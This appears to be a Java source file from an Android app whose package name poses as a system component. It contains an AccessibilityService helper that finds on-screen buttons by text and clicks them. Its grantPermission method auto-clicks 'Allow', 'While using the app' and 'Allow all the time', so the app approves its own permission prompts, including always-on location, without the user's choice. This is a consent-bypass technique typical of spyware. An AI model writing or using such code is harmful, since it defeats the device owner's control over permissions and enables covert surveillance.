package com.xrc.system.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import com.xrc.system.core.Constants;

import java.util.List;

public class AutoClicker {
    private static final String TAG = Constants.TAG + ":AutoClick";

    public static void clickIfFound(AccessibilityService service, String text) {
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return;
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
            for (AccessibilityNodeInfo node : nodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "Clicked: " + text);
                }
                node.recycle();
            }
            root.recycle();
        } catch (Exception e) {
            Log.e(TAG, "AutoClick failed", e);
        }
    }

    public static void grantPermission(AccessibilityService service) {
        clickIfFound(service, "Allow");
        clickIfFound(service, "While using the app");
        clickIfFound(service, "Allow all the time");
    }
}
